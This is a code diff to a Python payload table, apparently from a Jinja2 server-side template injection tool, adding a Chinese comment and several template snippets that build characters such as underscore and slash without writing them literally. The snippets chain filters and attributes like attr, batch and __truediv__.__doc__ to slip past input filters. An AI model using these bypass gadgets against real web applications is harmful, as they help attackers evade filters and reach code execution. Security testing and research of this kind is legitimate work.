@@ -8,6 +8,7 @@ from typing import Iterable, Dict, Any, Callable
 
 ContextPayloads = Dict[str, Dict[str, Any]]
 
+# 所有上下文的payload, 变量名不能重复
 context_payloads_all: ContextPayloads = {
     "{%set oa={}|int%}{%set la=oa**oa%}{%set lla=(la~la)|int%}"
     + "{%set llla=(lla~la)|int%}{%set lllla=(llla~la)|int%}": {
@@ -46,8 +47,15 @@ context_payloads_all: ContextPayloads = {
     "{%set b={}|escape|urlencode|count%}": {"b": 6},
     "{%set e=(dict(a=x,b=x,c=x)|count)%}": {"e": 3},
     "{%set l={}|escape|first|count%}": {"l": 1},
-    "{%set un=({}|select()|trim|list)[24]%}": {"un": "_"},
-    "{%set urn={}|select()|trim|list|batch(25)|first|last%}": {"urn": "_"},
+    "{%set ndl=({}|select()|trim|list)[24]%}": {"ndl": "_"},
+    "{%set ndll={}|select()|trim|list|batch(25)|first|last%}": {"ndll": "_"},
+    "{%set ndlll={}|select()|trim|list|attr(dict(po=x,p=x)|join)(24)%}": {"ndlll": "_"},
+    "{%set ndr={}|select()|trim|list|batch(25)|first|last%}{%set sls=1|attr"
+    + "((ndr,ndr,dict(truediv=x)|join,ndr,ndr)|join)|attr"
+    + "((ndr,ndr,dict(doc=x)|join,ndr,ndr)|join)|batch(12)|first|last%}": {
+        "ndr": "_",
+        "sls": "/",
+    },
     "{%set unn=lipsum|escape|batch(22)|list|first|last%}": {"unn": "_"},
     "{%set perc=lipsum()|urlencode|first%}": {"perc": "%"},
     "{%set percc=(lipsum[((({}|select()|trim|list)[24]))*2+"
